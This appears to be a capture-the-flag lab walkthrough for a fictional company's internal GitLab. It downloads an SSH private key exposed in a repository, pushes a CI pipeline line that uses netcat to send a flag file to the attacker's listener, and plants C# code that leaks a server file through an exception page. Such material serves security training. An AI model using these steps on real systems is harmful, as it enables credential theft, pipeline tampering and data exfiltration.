# TODO: Better Code Auditing Solution

- Navigate to int-gitlab.bigsoftware.com.
- Click explore at the bottom left.
- Open the web-store-extensions/ShippingPlugin project.
- navigate into the `.ssh/` directory and view the contents of the `id_rsa` file. Click to view the `raw` contents of the file.
- Open git bash on the Desktop through the right click menu.
- Create a `.ssh/` directory in your home directory -- 
    ```bash
    cd ~/ && mkdir .ssh
    ```
- Use wget to download the raw `id_rsa` private key file and store it in the `.ssh/` directory -- 
    ```bash
    cd .ssh && wget http://int-gitlab.bigsoftware.com/web-store-extensions/ShippingPlugin/-/raw/master/.ssh/id_rsa
    ```
- Change directories back to the Desktop -- 
    ```bash
    cd ~/Desktop
    ```
- Clone the ShippingPlugin project (no permissions required):
    ```bash
    git clone git@int-gitlab.bigsoftware.com:web-store-extensions/ShippingPlugin.git
    ```
- Get your system's IP address through `ipconfig`.
- In the .gitlab-ci.yml file (it's hidden in the git bash prompt), insert a new line after line 10 with the same indentation as line 10: 
    ```
    - "nc 10.0.0.58 5555 < /home/deployer/build-flag.txt"
    ``` 
    _Make sure to use your VM's actual IP address (it's given through DHCP)._
- Open a separate command prompt and enter 
    ```bash
    ncat -l -p 5555
    ```
- Back in the git bash prompt (still in the ShippingPlugin local repository), you'll need to set an email address and name before committing the file. Run 
    ```bash
    git config --global user.email "jsmith@bigsoftware.com"

    git config --global user.name "John Smith"
    ```
- Next, 
    ```bash
    git add .gitlab-ci.yml
    
    git commit
    ``` 
    Notepad++ will pop up prompting for a commit message. Enter whatever you want (you have to enter something, but it doesn't matter what), save the file, and close the editor.
- ```bash
    git push -u origin master
    ```
- After a short time, the first flag should show up in the netcat command prompt.
- Next, enter the ShippingPlugin sub-directory (if you cloned the project as above, you'll be in ShippingPlugin/ShippingPlugin).
- Insert a few lines after line 15 
    ```csharp
    string text = System.IO.File.ReadAllText(@"/home/webapp/deploy-flag.txt");
    throw new ArgumentOutOfRangeException(text);
    ```
- Add, commit, and push this file to the server.
    ```bash
    git add . 
    git commit -m "Commit message"
    git push origin master
    ```
- Wait about a minute, and then navigate your browser to `store.bigsoftware.com`. add any item to your cart, click checkout, log in using the example credentials on the page, and click shipping. Enter any zip code, and then click Calculate Shipping.
- If done right, the page will display an exception with the contents of the deploy-flag.txt file displayed near the top of the page.
